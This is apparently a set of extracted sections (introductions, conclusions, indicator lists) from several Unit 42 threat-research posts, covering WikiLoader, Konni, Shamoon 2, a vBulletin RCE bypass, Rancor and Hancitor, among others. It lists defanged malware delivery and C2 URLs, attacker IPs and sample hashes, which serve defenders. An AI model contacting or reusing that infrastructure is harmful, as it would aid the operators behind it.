FirewallwithCloud-Delivered Security Services \nAdvanced WildFire \nAdvanced DNS Security \nAdvanced URL Filtering \nThe Prisma CloudCloud Security Agent (CSA)\nAdditionally, Google has confirmed that all sites mentioned in this article are known to Safe Browsing. Any user that visits these sites will receive a warning of potential security risks.", "source": "Palo"}, {"title": "Conclusion", "content": "Financially motivated threat actors will continue to use WikiLoader as a loader for rent in a variety of campaigns where they require a robust, stealthy Windows loader that pays reasonable attention to OPSEC.\nWhat remains to be seen is why threat actors have shifted from phishing to SEO poisoning to deliver WikiLoader. One hypothesis is that another initial access broker (IAB) has begun to work with WikiLoader to operationalize its delivery through SEO poisoning in recent months. Alternatively, groups that are publicly tracked using WikiLoader could have shifted to SEO poisoning from phishing after an improvement in endpoint security controls or industry reporting disrupted their operations.\nWhile SEO poisoning is not a new technique, it continues to be an effective way to deliver a loader to an endpoint. Spoofing trusted security software is likely to assist in bypassing endpoint controls at organizations that rely on filename based allow listing.\nThe combination of spoofed, compromised and legitimate infrastructure leveraged by WikiLoader campaigns reinforces the malware authors attention to building an operationally secure and robust loader, with multiple C2 configurations. The authors suspect that we will likely see continued WikiLoader use throughout 2024 and beyond.\nRegardless of the anti-analysis and EDR evasion techniques employed by WikiLoader, the procedures employed can be identified using many common endpoint threat hunting methods. We share a selection of four queries in our appendix that organizations can use to hunt for WikiLoader with high fidelity in endpoint data. The queries can be expanded in scope with minimal changes from XQL users to cast a wider net, or narrow in on threats that may be more applicable to an organization's environment.\nGoogle has confirmed that all sites mentioned in this article are known to Safe Browsing. Any user that visits these sites will receive a warning of potential security risks.\nPalo Alto Networks Protection and Mitigation\nPalo Alto Networks customers are better protected from the threats discussed above through the following products:\nNext-Generation FirewallwithCloud-Delivered Security Services, includingAdvanced WildFire, detect the files mentioned within this report as malicious. AdditionallyAdvanced URL FilteringandAdvanced DNS Securityidentify known URLs and domains associated with this activity as malicious. \nCortex XDRcustomers are better protected against the sideloads and shellcode injection attempts mentioned in the article. Cortex XDR detects and prevents these malware activities based onBehavioral Threat Protection, AI-driven local analysis, analytics profiles and other security engines across Windows, Linux and Mac systems. \nPrisma Cloud can detect known WikiLoader binaries executed from within cloud environments through theCloud Security Agent (CSA).\nIf you think you may have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call:\nNorth America Toll-Free: 866.486.4842 (866.4.UNIT42) \nEMEA: +31.20.299.3130 \nAPAC: +65.6983.8730 \nJapan: +81.50.1790.0200\nPalo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Indicators", "content": "These indicators were active throughout June 2024.\nDelivery URLs\nURL:hxxps://globalprotect[.]securedownload[.]today/GlobalProtect64.zip\nDescription: URL serving archive impersonating GlobalProtect.\nURL:hxxps://globalprojectvpn[.]com\nDescription: Fake GlobalProtect site that delivers fakeGlobalProtect64.zip\nURL:hxxps://globalprojectvpn[.]com\nDescription: Fake GlobalProtect site that pulled from a Bitbucket project to deliver fakeGlobalProtect64.zip\nURL:hxxps://bitbucket[.]org/bitprotect/globalproject/src/main/\nDescription: Bitbucket project that hosted fakeGlobalProtect64.zip\nWikiLoader C2 URLs\nhxxps://carniceriamartinezadria.com/wp-content/themes/twentytwentyfour/rleoec.php?id=1 \nhxxps://jlholgado.com/wp-content/themes/twentytwentyfour/zca2ck.php?id=1 \nhxxps://elpgtextil.com/wp-content/themes/twentytwentyfour/44snwx.php?id=1 \nhxxps://arbeitsschutz-mmk.de/plugins/search/contacts/chrndi.php?id=1 \nhxxps://www.estudioemm.com/wp-content/themes/twentytwelve/d4kih3.php?id=1\nDescription: C2 providing the decryption key to the payload of the WikiLoader sample\nSHA-256 hashes for WikiLoader shellcode loader DLLs\nd4eb9a4ee389f03c402e553724015af8d5b85835828bd66b1b45131b6837802f \n534c989d110ece8c429d2ded913933b961710726d8655b858474bc31dfed25c3 \na001642046a6e99ab2b412d96020a243a221e3819eaac94ab3251fad7d20614b \nc6c250e1cd6d5477b46871ffe17deac248d723ad45687fc54ae4fc5e3f45d91c \nf1a49cea454bac3e78ac765b247b65d00c896d84de2028892b00d4310453c665 \n2ab449666cf006125075e3ded8053cdfd318e4772d4145f0fa861f1d42cb2b08 \n1d6f76acecff63fb373b5774a3cb34b87266a4a4bbb8e3a0757d107187d280ee \nb412b2c190b8406392406d9a8e3abce91c9014950bcf835eb7d9b50d0f128cb0 \n66735d0178badf035be0e142f4fb8e23d860bfc9bbdc3e12ad1f2764de91ee9b \nedec55f87e535f869119db44e4e7302081f53dbf33a27aaf905430cedc5a78b9 \n148b29123bb0c28614858460d7a10707469fecebd6a9ff1da98a0c76a89a9819 \n0de42118dd0cd861bea13de097457ccb407aae901b14e0bec59b0abe660cdf1f \n5576ab87eb11ca4d2944bc1c2c6a8c349e18c7ded583c1ba9bd99eff9d8ac4d7 \n551da6814a01a280afe90aa6bb238f499d98ad496c0d8472a1705540a6f422da \n4f573ab13882efa234a79483d305b3001cb09c0a166ff94c925844b860162415 \n4f2079cd2e228a2777df45ae00714c8679531fd8ad82a66b5c1b10e800771f18 \n2add886330db1480da7314ee38428ca79af04f8c461c3bbbd68e202bb5f4c415 \n76d1a876c90ec16f44685f795e64ab84bd2d3f5a91db659c9879b3461ee104f9 \n6aa4a830aa8d89b629fe87d3d3e986042215b5bcd670417933fca854b6dd58d9 \n1c1d739f0282bfd9367e29ca81c61ed4a731e5150a836d0371e5e9d0121c9dfd \n69a94bbed366bfd917dfd8fb6e5fd7ba52e2dbf338edd0c259654981060943c8 \n9a48f32e00877a4335206c7da45a94ca8bd46648d3a0bc88e0789dabf8139024 \nc3280452e7c96253b215342f2fac14634591adf68f88bcf7dc920d5f28022cd6 \n0c44a46f1c8e46fe6b6f83ec249c95301aca1bc4765cee7bdadd021bbfd2ff66 \n2b8b3f5b692f716116a1468b8d7b273baf7a6cef0726e831cd307d2f2c7452ec \ne07787caf52dd3e7dd0da600dbd1d909f3799dcebcdc60d101baf3ea17ef1e32 \n50810e4696dd075ca23349e3e1c3a87fc7b46ab89f4b1eb093a5cfb74f84cc51 \n912cc2a3592b3b7835205d275cbf92bb66effc99cbd5cc338a223888de1b0d35 \nf04715827e5453b33ba6fae8475b8c45150b27cc1361441648c46d13025283d2 \ne693652763141522621f9fcd80efb30cefa363f8bd9bdc65e5ffbf9fb8d76d3b \n8d5e185d53e81e90646d684dff7cb399973e3cde6d833e6f7431074f4362139a \nec59616b1c80951d6597d4f25a9c031be0391151dc1073a5bece466473f0bdfe \ne7e674218a7d93595e33a092f4f519a65499651a398ca350f5a50e135e64fa41 \n78f6f94aaa72e41d64e4dc309a3553399db2b4cd0edae5653ca4b6e7839e1215 \nabce298ebb4ac7bc1a5167179875afc88e7e99475bf681953e8b964237b7d7ed \n82ec4e1a6ddf6eeb4030d6dd698f4576d0445d4d5722d5c60b0cc74ac501bb85 \n0d495a94e29faa4dfded29253322be1b2c534a56c078bea1ad8f1dc1fd23b742\nSHA-256 hashes for WikiLoader backdoor\n4044a0d7a0ed7f66efc2bd13616ec63a5722fc7a73a28fe3bda513f60ef24dd9 \nc9eaaa6aee55704ce651c8b4cde7949cfa9711e05a136fa15f234d1bb2ea994c", "source": "Palo"}, {"title": "Introduction", "content": "Between July and October 2019, Unit 42 observed several malware families typically associated with the Konni Group (seeAttributionsection below for more details) used to primarily target a US government agency, using the ongoing and heightened geopolitical relations issues surrounding North Korea to lure targets into opening malicious email attachments. The malware families used in this campaign consisted mainly of malicious documents featuring CARROTBAT downloaders with SYSCON payloads, but also included a new malware downloader Unit 42 has dubbed CARROTBALL.\nCARROTBALL, initially discovered in an attack during October 2019, is a simple FTP downloader utility which facilitates the installation of SYSCON, a full-featured Remote Access Trojan (RAT) which leverages FTP for Command and Control (C2). It was found embedded in a malicious Word document sent as a phishing lure to a US government agency and two non-US foreign nationals professionally associated with North Korea.\nThroughout the course of the campaign, Unit 42 ultimately observed a total of six unique malicious document lures being sent as attachments from four unique Russian email addresses to 10 unique targets. The subject matter of the lures featured articles written in Russian pertaining to ongoing geopolitical relations issues surrounding North Korea. Of those malicious documents, five contained CARROTBAT downloaders, and one contained a CARROTBALL downloader. All malicious second stage payloads were SYSCON.\nWhile this campaign does demonstrate some evolution in the actor's tactics, techniques and procedures (TTPs) with the use of a new downloader family and new malicious code in the form of Word Document macros, the majority of its attributes bear a strong resemblance to the Fractured Block campaignpreviously reported by Unit 42 in November 2018. As such, Unit 42 has dubbed this campaign Fractured Statue. The Adversary Playbook for the activity described in this blog can be foundhere.\nFigure 1. Fractured Statue Campaign Timeline", "source": "Palo"}, {"title": "Conclusion", "content": "Overall, the Fractured Statue campaign provides clear evidence that the TTPS discovered in Fractured Block are still relevant, and that the group behind the attacks still appears to be active. Additionally, development and use of the new downloader, CARROTBALL, alongside the more commonly observed malware delivery mechanism, CARROTBAT, may indicate that the previous methods employed by the group to successfully infect their targets are becoming less effective. The Adversary Playbook for the activity described in this blog can be foundhere.\nPalo Alto Networks customers are protected from this threat in the following ways:\n* AutoFocus customers can track these samples with theFracturedStatue,SYSCON,KONNI,CARROTBATandCARROTBALLtags.\n* WildFire detects all files mentioned in this report with malicious verdicts.\n* Cortex XDR blocks all of the files currently associated with the Fractured Block campaign.", "source": "Palo"}, {"title": "IOC", "content": "a4f858c6b54683d3b7455c9adcf2bb6b7ddc1f4d35d0f8f38a0f131c60d1790f\ned63e84985e1af9c4764e6b6ca513ec1c16840fb2534b86f95e31801468be67a\n9dfe3afccada40a05b8b34901cb6a63686d209e2b92630596646dba8ee619225\n4c201f9949804e90f94fe91882cb8aad3e7daf496a7f4e792b9c7fed95ab0726\n63c3817a5e9984aaf59e8a61ddd54793ffed11ac5becef438528447f6b2823af\nc1a9b923fc1f81d69bd0494d296c75887e4a0f9abfc1cdfbfa9c0f4ab6c95db7\n56924402a17393e542f6bf5b02cd030cc3af73bc2e1c894a133cebb2ca9405ee\nceb8093507911939a17c6c7b39475f5d4db70a9ed3b85ef34ff5e6372b20a73e\n52ba17b90244a46e0ef2a653452b26bcb94f0a03b999c343301fef4e3c1ec5d2\n4958fe8c106200da988c22957821513efd05803460e8e5fcfedb5cbca8d87a5b\n7d2b1af486610a45f78a573af9a9ad00414680ff8e958cfb5437a1b140acb60c\nbdd90ed7e40c8324894efe9600f2b26fd18b22dcbf3c72548fee647a81d3c099\nf3d3fa4c76adfabd239accb453512af33ae8667bf261758f402fff22d9df1f67\n4b8790e9cb2f58293c28e695bec0a35e2ebd2da8e151c7e8c4513a1508c8bc94\nad63b8677c95792106f5af0b99af04e623146c6206125c93cf1ec9fbfeafaac9\nc3ac29e4b0c5e1a991d703769b94c0790fbf81fd38cf6acdb240c5246c2517ca\na761b47ab25dc2aa66b2f8ad4ab9636e40ebbcaf67f8a34f3524456c09f47d76\n42e874d96cb9046cd4113d04c1c5463b1d43a4e828ca872de11c08cd314e650f", "source": "Palo"}, {"title": "Introduction", "content": "Recently, we discovered several new malware samples with unique characteristics that made attribution and function determination challenging. While many threat actors will strictly use tools released by the offensive security community, we also encounter novel, custom-built malware \u2013 sometimes with new tricks and techniques. This article describes three particularly unusual malware examples we came across last year.\nThe first malware sample is a passive Internet Information Services (IIS) backdoor developed in C++/CLI, a programming language very rarely used by malware authors. \nThe second sample is a bootkit that uses an unsecured kernel driver to install aGRUB 2bootloader for a rather unusual purpose. \nThe third sample is a Windows implant of a cross-platform post-exploitation framework developed in C++.\nAlthough the last example is a red team tool that doesn't use any novel methods, we believe it is worth reviewing due to significant deviation from other post-exploitation frameworks we've seen during the past year.\nPalo Alto Networks customers are better protected from these malware samples throughAdvanced WildFire, with its different memory analysis features.\nCortexXDRandXSIAMare designed to prevent the execution of known malicious malware, and also prevent the execution of unknown malware using Behavioral Threat Protection and machine learning based on the Local Analysis module.\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response team.", "source": "Palo"}, {"title": "Summary", "content": "This passive IIS backdoor written in C++/CLI has numerous functionalities and is likely under active development. All network traffic is encrypted and encoded. Even though it has been professionally created, there appear to be weak spots that facilitate detection and analysis. All (debug) strings are stored in cleartext, making analysis easier. Additionally, the malware uses hard-coded passwords and keys for authentication.\nWe assess this malware is quite uncommon, because we have not yet discovered any other comparable samples. This rarity indicates the malware could have been used in a targeted attack, especially with its unusual development language and sophisticated nature. However, we cannot yet attribute this malware to any known threat actor.", "source": "Palo"}, {"title": "Summary", "content": "To our knowledge, this is the first malware that installs a GRUB 2 bootloader. While having a few characteristics of previous Equation Group samples, we do not believe this malware is connected to this threat actor. We believe this malware is a PoC created by somebody from the University of Mississippi and they might have dropped it on a campus computer.\nWhile the abused third-party driver was later alsofound to be vulnerableby Northwave Cyber Security, this malware merely abused it to write the bootloader to disk, because this driver is also unsecured. There is no exploit used, but it rather abuses the driver's unsecured write dispatch routine. The usual term \"bring your own vulnerable driver\" (BYOVD) wouldn't really fit in this case.", "source": "Palo"}, {"title": "Summary", "content": "ProjectGeass is a post-exploitation framework that appears to have been developed for a professional or commercial purpose. As we have not yet found any other similar samples, this may be a private or non-public project. We cannot attribute it to any known company or organization. Since this malware uses a Chinese site (ipv4.renfei[.]net) to check its host's external IP address, the creator might be Chinese. However, that is all conjecture.", "source": "Palo"}, {"title": "Conclusion", "content": "A number of new and interesting types of malware appeared in the past year, each using strategies that had not been reported before. This article reviewed three examples.\nThe first piece of malware we examined is a passive IIS backdoor that showed indications that attackers used it in targeted attacks. It was also developed in a programming language rarely used for malware, C++/CLI.\nThe second sample uses a third-party kernel driver to install a GRUB 2 bootloader, which we have not seen before.\nThe third sample, named ProjectGeass, appears to be a new post-exploitation framework in development. This may have been created for professional or commercial purposes, and possibly developed by a Chinese speaker.\nPalo Alto Networks customers are better protected from these malware samples throughAdvanced WildFire, with its different memory analysis features.\nCortexXDRandXSIAMare designed to prevent the execution of known malicious malware, and also prevent the execution of unknown malware using Behavioral Threat Protection and machine learning based on the Local Analysis module.\nIf you think you may have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call:\nNorth America: Toll Free: +1 (866) 486-4842 (866.4.UNIT42) \nUK: +44.20.3743.3660 \nEurope and Middle East: +31.20.299.3130 \nAsia: +65.6983.8730 \nJapan: +81.50.1790.0200 \nAustralia: +61.2.4062.7950 \nIndia: 00080005045107\nPalo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Introduction", "content": "This research explores the security landscape of the Internet-facing services hosted in Amazon AWS, Microsoft Azure and Google Cloud Platform. Public cloud is becoming increasingly popular and thereportedtotal spending on cloud infrastructure grew 45.6% in 2018. Amazon AWS maintained its lead with a 31.3% share of the Cloud Service Provider (CSP) market, followed by Microsoft Azure with 16.5%, and Google Cloud Platform, with 9.5%. CSPs offer various \"as-a-service\" models that give businesses agility and flexibility to scale operations without worrying about the IT infrastructure. However, a single insecure configuration can put the entire infrastructure at risk.\nWe focused on evaluating public cloud from the publicly exposed hosts. We collected information including exposed services, service versions and service vulnerabilities to determine the security posture of each host. We also investigated the correlation between malicious IPs in public cloud and prior known vulnerabilities.Our analysis revealed that:\n47%of SSH servers on Azure may be vulnerable to brute-force attacks due to the \"use password-login\" option. \n32%of exposed public cloud hosts have SSH servers open. \n24%of exposed public cloud hosts have known vulnerabilities. \n50%of exposed public cloud vulnerabilities have been known for at least two years. \n61%of exposed public cloud hosts are still on TLSv1.1 or older versions (v1.2 and v1.3 were released in 2008 and 2018, respectively).\nWe also discovered evidence that attackers are using public cloud as a stepping stone to launch attacks. Cloud infrastructure is still considered more secure than on-premise infrastructure due to the significant resources that CSPs dedicate to maintaining and upgrading their infrastructure. AWS, Azure, and GCP each had less than 20 CVEs identified in 2018as opposed to thousands of vulnerabilities found in Windows or Linux every year, according to theNIST National Vulnerability Database (NVD). However, there is no shortage of cloud security incidents across all CSPs. Examples includeleaked voting machine passwords, the leak ofIndian citizen records, andleaked user job profiles). Prior research fromRedLock,NetSkopeandMcAfeeshowed that most cloud security incidents are attributed to misconfigurations by cloud customers, not the CSPs. While some security responsibilities have been gradually shifted from users to CSPs, users are always responsible for some security design and decisions. Secure cloud infrastructure can only be achieved when both CSPs and users fulfill their responsibilities.\nThis blog reviews the current state of the public cloud service providers, then provides details on exposed services, exposed vulnerabilities, and malicious IPs. We conclude with a set of open-source tools to help users secure their public cloud infrastructure.", "source": "Palo"}, {"title": "Conclusion", "content": "Public cloud adoption continues to accelerate as it plays an increasingly significant part in next-generation IT. Although Amazon launched AWS more than 13 years ago, CSPs started to focus more on security in recent years. About 75% of allAmazoncloud security productswere launched within the last three years.\nIn public cloud, security is a shared responsibility between the CSP and the users. As there are so many cloud services in public cloud, most of the users are probably unaware of their security responsibilities. CSPs not only should secure their cloud services but also set up guardrails to prevent and detect insecure user behavior. The findings in this study reiterate the importance of \"security by default.\" If there were no insecure options, the users could not have made insecure decisions. If CSPs proactively monitored for insecure user behavior and alerted users with actionable remediation, there would not have been so many exposed services.\nThere are, however, still designs and decisions for which users should be responsible. Users need to have minimal security awareness to work in the cloud. Although Function-as-a-Service removes a lot of maintenance burden from the users, developers still need to write the code and assign proper permission to each function. If new vulnerabilities are found in the libraries that the functions use, only the developer can patch and update the source code. If CSP alerts an exposed SSH service and recommends a firewall configuration to restrict inbound traffic, only the system admins know what IPs the firewall should allowlist. These trivial tasks are too often neglected, which can lead to catastrophic outcomes. The sheer volume of security incidents caused by weak credentials or exposed databases have numbed the security community. Yet there is no sign that the number of related security incidents is slowing down. Different organizations simply repeat the same mistakes at different CSPs.\nPerfect security is almost impossible, but one should always conduct due diligence to minimize the chance of compromise. Thanks to the open-source community, there are plenty of free tools to simplify a complex job. These tools that can help users bridge the security gap in their cloud infrastructure.\nVulnerability scanners:Developers should continuously scan their code for known vulnerabilities.Prisma Scan,Clair,OpenSCAP, andOpenVAScan identify the vulnerable packages in your system.\nCloud infrastructure auditing: System administrators should continuously audit their cloud infrastructure and detect misconfiguration.Prisma IaC Scanner,ScountSuit, andCloudSploitcan identify potentially misconfigured components in your cloud infrastructure.\nExposed hosts and services monitoring: System administrators can monitor the IP blocks that they own from the internet.ShodanandCensysare IoT search engines that periodically scan the entire internet.", "source": "Palo"}, {"title": "Introduction", "content": "Since late November 2016, theShamoon 2attack campaign has brought three waves of destructive attacks to organizations within Saudi Arabia. Our investigation into these attacks has unearthed more details into the method by which the threat actors delivered the Disttrack payload. We have found evidence that the actors use a combination of legitimate tools and batch scripts to deploy the Disttrack payload to hostnames known to the attackers to exist in the targeted network.\nOur analysis shows that the actors likely gathered the list of known hostnames directly from Active Directory or during their network reconnaissance activities conducted from a compromised host. This network reconnaissance, coupled with the credential theft needed to hardcode Disttrack payloads with legitimate username and password credentials, leads us to believe that it is highly likely the threat actors had sustained access to the targeted networks prior to Shamoon 2 attacks. Our research confirms that successful credential theft from targeted organizations was an integral part of the Shamoon 2 attackers' playbook, and they used these stolen credentials for remote access and lateral movement.\nOur analysis also shows an actor distributes Disttrack within the targeted network by first compromising a system that is used as the Disttrack distribution server on that network. The actor then uses this server to compromise other systems on the network by using the hostname to copy over and execute the Disttrack malware. On each of these named systems that are successfully compromised, the Disttrack malware will attempt to propagate itself to 256 additional IP addresses on the local network. This rudimentary, but effective, distribution system can enable Disttrack to propagate to additional systems from a single, initially compromised system in a semi-automated fashion.\nIn this posting we also explore a possible connection between Shamoon 2 and theMagic Hound campaign, where we outline evidence of a potential connection between these two attack campaigns. Furthermore, we explore a possible scenario on how these two attack campaigns could have worked in conjunction with each other to execute the Shamoon 2 attacks.", "source": "Palo"}, {"title": "Conclusion", "content": "We have determined that the actors conducting the Shamoon 2 attacks use one compromised system as a distribution point to deploy the destructive Disttrack Trojan to other systems on the targeted network, after which the Disttrack malware will seek to propagate itself even further into the network. Using an open source utility called PAExec and several batch scripts, the actor copies the Disttrack payload to other systems on the network, which we believe are discovered directly from Active Directory or through network reconnaissance activities. Once the Disttrack payload has been deployed to these initial hosts, Disttrack will attempt to spread on their local networks to amplify the impact of the attack. While the actors interact directly with the distribution system, the use of this single compromised system allows the actors to automate the deployment of the payload to quickly infect systems on the targeted network. Also, these findings provide a possible relation between the Shamoon and Magic Hound attack campaigns. We will continue to analyze these attacks to determine further activities carried out by these actors and expose any additional correlations to known threat groups.\nThe theft and subsequent reuse of credentials is a common element in many attackers' playbooks. We have recently published a white paper, \"Credential-Based Attacks: Exposing the Ecosystem and Motives Behind Credential Phishing, Theft and Abuse,\" detailing how credentials are stolen and later abused, with guidance on how you can defend yourself and your organization against this type of threat. Collectively, the Shamoon 2 attacks are a good example not only of ways attackers obtain stolen credentials but also of what they can do with them.", "source": "Palo"}, {"title": "Indicators", "content": "4919436d87d224f083c77228b48dadfc153ee7ad48dd7d22f0ba0d5090b5cf9b: exec-template.txt5475f35363e2f4b70d4367554f1691f3f849fb68570be1a580f33f98e7e4df4a: ok.bat01a461ad68d11b5b5096f45eb54df9ba62c5af413fa9eb544eacb598373a26bc: pa.exec7f937375e8b21dca10ea125e644133de3afc7766a8ca4fc8376470277832d95: ntertmgr32.bat\nIgnite '17 Security Conference: Vancouver, BC June 12\u201315, 2017\nIgnite '17 Security Conference is a live, four-day conference designed for today's security professionals. Hear from innovators and experts, gain real-world skills through hands-on sessions and interactive workshops, and find out how breach prevention is changing the security industry. Visit theIgnite websitefor more information on tracks, workshops and marquee sessions.", "source": "Palo"}, {"title": "Introduction", "content": "In September 2019, a remote code execution (RCE) vulnerability identified asCVE-2019-16759was disclosed for vBulletin, a popular forum software. At that time, Unit 42 researchers published ablog on this vBulletin vulnerability, analyzing its root cause and the exploit we found in the wild. By exploiting this vulnerability, an attacker could have gained privileged access and control over any vBulletin server running versions 5.0.0 up to 5.5.4, and potentially lock organizations out from their own sites.\nRecently, Unit 42 researchers found exploits in the wild leveraging the vBulletin pre-auth RCE vulnerabilityCVE-2020-17496. The exploits are a bypass of the fix for the previous vulnerability, CVE-2019-16759, which allows attackers to send a crafted HTTP request with a specified template name and malicious PHP code, and leads to remote code execution.More than 100,000 sitesare built on vBulletin, including the forums of major enterprises and organizations, so it's imperative to patch immediately.\nIn this blog, we provide details on the bypass of the patch of the vulnerability, proof of concept code (PoC) to demonstrate the vulnerability and information on attacks we have observed in the wild.\nPalo Alto Networks customers are protected by the following services and products viaThreat Preventionsignatures andURL Filteringblocks the related C2 traffic.", "source": "Palo"}, {"title": "Conclusion", "content": "There are multiple kinds of exploit attempts against vBulletin pre-auth RCE vulnerability CVE-2020-17496 being detected by our threat platform. As a widely used forum software package that has been running for a long time in the market, it has been identified as a prized target by attackers.\nvBulletin released thepatchto fix this vulnerability on Aug. 10, 2020. Applying the patch to the latest version will mitigate the risks, which is strongly advised.\nPalo Alto Networks customers are protected by the following services and products:\nThreat PreventionSignature 59133 and 80671. \nURL Filteringblocks the related C2 traffic of the Shellbot.", "source": "Palo"}, {"title": "Indicators", "content": "88DDD8A1B77477AAFFD1BB163B9770D72A77BF29BFCA226E79C28D15BEF983ED\n03bfec4e039805091fe30fa978d5ec7f28431bb0fca4b137e075257b3e1c0dd4\nb4cb04709f613b5363514e75984084ef1d3eaba7c50638b2a5a284680831b992\n94f02ea10b4546da71bd46916f0fe260b40c8ed4deccf0588687e62ca3819ad7\nbd72be4f7d64795b902f352e47b1654eaee6b5a71cddfaf2c245dba1b2d602eb\n77b4f7f0d66a0333d756116eaae567a8540392f558c49d507bf6da10bd047fe3\n051baaabf205c7c0f5fd455ac5775447f9f3df0cc9bc5f66f6d386f368520581\nfd63b9c7e9dce51348d9600f67139ea8959fdbbca84d505b5e9317bbdca74016\n8b5810e07cf21ebb1c2ff23c13ce88022c1dd5bc2df32f4d7e5480b4ddb82de2\nded23c3f5f2950257d8cfb215c40d5f54b28fde23c02f61ce1eb746843f43397\n80fb66c6b1191954c31734355a236b7342dc3fd074ead47f9c1ed465561c6e8c\nf30bb52c0e32dfe524fc0dfda1724a1ffb88647c39c33a66dfd66109fecceec7\n1900e09983acf7ddc658b860be7875a527bc914cbffcf0aaff0b4182ecef047b\nfa7575bd0cd2a83995ea34d8d008eb07c2062a843e5e155e2e0d8b35a0cf7901\n68132010d9a543a6a2a9ea61e771cf2c041cea259cc76affdfe663e20c130a45\nab671fc0c68ed1c249c2bb52b28ae3d70df8bd1614d86f6d6a3f4c21d7841d72\n4ff21e69b11566336f4fd56ac2829cdcf215182e8ff807f8e744c0a2b08f726f\na7373fa18b367edbcd4462345a5da087821e34734bdf05d1c4060a7694868c5e\ndec56b06e03665d2c656b530d3b6f90ca0ec2925bec4559d8a2cec5da3a7700b\nc379139347470254f19041f05e19f5454750e052f04f6d377ec8df19ce959519\nfed0f0d3e9d990f8a83b86d29e586d46e7cac54efb0eae2f07112d61afb9b885\n84448ee487010d6fed918febe230b71a8ec1266e300f85933014db2566645857\n994889422b24a5b4759eda30265f1b933a458e15927b4f7949d4a3ba79eb43ca\n39b6d72101adae2b71815328599f8e67ee27955849dfb3825c5b2731d504696b\n0747988a77c89c1267a882b663fbd4168e25aed239fb1553e65bb4ac74ecda67\n99d06d1c82af244b1533c1173ca10da7f29bfbf753073f20f5dc7a0016152a4c\n372ab5c1c23d198b594353239a96d6cf620cc56588f5fdf5dfb32919dd019020\nef2a6b37568e14dacd5d8894ce2e4bbc593ffd58e197827a052d2c2f0a756949\n1cf9ac9150d59de25ca5ac1f855fadf1b03f13b4e9ced63a12acef9c8292a648\ncf172b4629e321e4c78a1d0717130bbb693392712a86d3d85d035bae1f377dbd\n1a0293d4863ccef36e138e4f6c65ad013a403db0ffc69ebaf04b43b61b4ba798\n2a14b9b01ec78a332be40339a782a2cf2bf9a237eee9cc5fcd40fa3385b1d4fb\nf56150ff764328ee59eeaafe5e2d63574b475a69386c9ac4978006070807edc9\n9572a532c08f81d7957ffd4639f95c34a2085f119fa426d8ea911af72bfd0b4a\n113ad91a1aab3abcd704fe8670fbc043f049586462a4c58dabdd44c14519ea66\nf9d7d9b11c60bd52625e7d9a33516c2bac96ac542a22696d0da3a9c536dae11b\n6f01ef6670ecd79f9b322dd8521bc13a73037e7f84fa9aad35d11d964d8f9e60\n2960748648bc2cd1b3db5e1e1ce9931a6588d65ae91c6d09e6b8bf2d78b00263\n66[.]7[.]149[.]161\n178[.]170[.]117[.]50", "source": "Palo"}, {"title": "Introduction", "content": "In late June 2018, Unit 42 revealed a previously unknown cyber espionage group we dubbedRancor, which conducted targeted attacks in Southeast Asia throughout 2017 and 2018. In recent attacks, the group has persistently targeted at least one government organization in Cambodia from December 2018 through January 2019. While researching these attacks, we discovered an undocumented, custom malware family - which we've named Dudell. In addition, we discovered the group using Derusbi, which is a malware family believed to be unique to a small subset of Chinese cyber espionage groups.", "source": "Palo"}, {"title": "Conclusion", "content": "Rancor, a cyber espionage group active since at least 2017, continues to conduct targeted attacks in Southeast Asia and has been found using an undocumented, custom malware family - which we've dubbed Dudell - to download a second stage payload once its malicious macro is executed. Additionally, Rancor is also using the Derusbi malware family to load a secondary payload once it infiltrates a target.\nPalo Alto Networks customers are protected from this threat. Ourthreat preventionplatform detects these malware families, withWildfirewhile and simultaneously updating the 'malware'category within thePAN-DB URL filtering solutionfor compromised domains it has identified. AutoFocus customers can further investigate this activity with the following tags:\nRancor \nPLAINTEE \nDUDELL \nDerusbi", "source": "Palo"}, {"title": "Introduction", "content": "This blog post is a continuation of my previous post,VB Dropper and Shellcode for Hancitor Reveal New Techniques Behind Uptick, where we analyzed a new Visual Basic (VB) macro dropper and the accompanying shellcode. In the last post, we left off with having successfully identified where the shellcode carved out and decoded a binary from the Microsoft Word document.\nOften when analysts are faced with an embedded payload for which they want to write a decoder, they simply re-write the assembly algorithm in their language of choice and process the file. The complexity of these algorithms varies when attempting to translate from machine code to a higher-level language. It can be quite frustrating at times, depending on the amount of coffee you've had and complexity of the algorithms.\nIn this post, I'll show how we can use an attacker's own decoding algorithm combined with CPU emulation to decode or decrypt payloads fairly easily by simply reusing the assembly in front of us. Specifically, I'll be focusing on using theUnicorn Enginemodule in Python to run the attacker's decoding functions within an emulated environment to extract our encoded payloads. Our end goal is to identify the command and control (C2) servers being used by the final Hancitor payload by running our Python script against the Microsoft Word document.\nNow, you may ask, why even worry about this to begin with? In the last post we just let the program run and the payload was written to disk for easy retrieval, so why bother? The main answer to that is bulk-analysis automation. If we can write a program that we can point at a directory full of documents, then we can quickly extract embedded payloads for C2 extraction and parsing to form a more holistic view of what we're dealing with. An example of such bulk analysis was witnessed earlier this year in July when welooked at a large sample set of LuminosityLink malware samples.", "source": "Palo"}, {"title": "Conclusion", "content": "Hopefully this was an educational demonstration using the extremely powerful Unicorn Engine to build a practical malware decoder. These techniques can be applied to many different samples of malware and can free you up from the more tedious process of figuring out how to program a slew of bitwise interactions and focus more on analysis and countermeasures.", "source": "Palo"}, {"title": "Indicators", "content": "At the followingGitHub repository, you will find 3 YARA rules, listed below, which can be used to detect the various pieces described throughout these two blogs, and the script that was built throughout this blog for decoding Hancitor.\nhancitor_dropper.yara \u2013 Detect Microsoft Word document dropperhancitor_stage1.yara \u2013 Detect first PE dropperhancitor_payload.yara \u2013 Detect Hancitor malware payload", "source": "Palo"}, {"title": "Introduction", "content": "Malicious actors often acquire a large number of domain names (called stockpiled domains) at the same time or set up their infrastructure in an automated fashion. They do so, for example, by creating DNS settings and certificates for these domains using scripts.\nAutomation employed by attackers can leave traces of information about their campaigns in various data sources. Security defenders can find these traces in locations such as certificate transparency logs (e.g., certificate field reputation or timing information) and passive DNS (pDNS) data (e.g., infrastructure reuse or characteristics).\nLeveraging these crumbs of information, we built 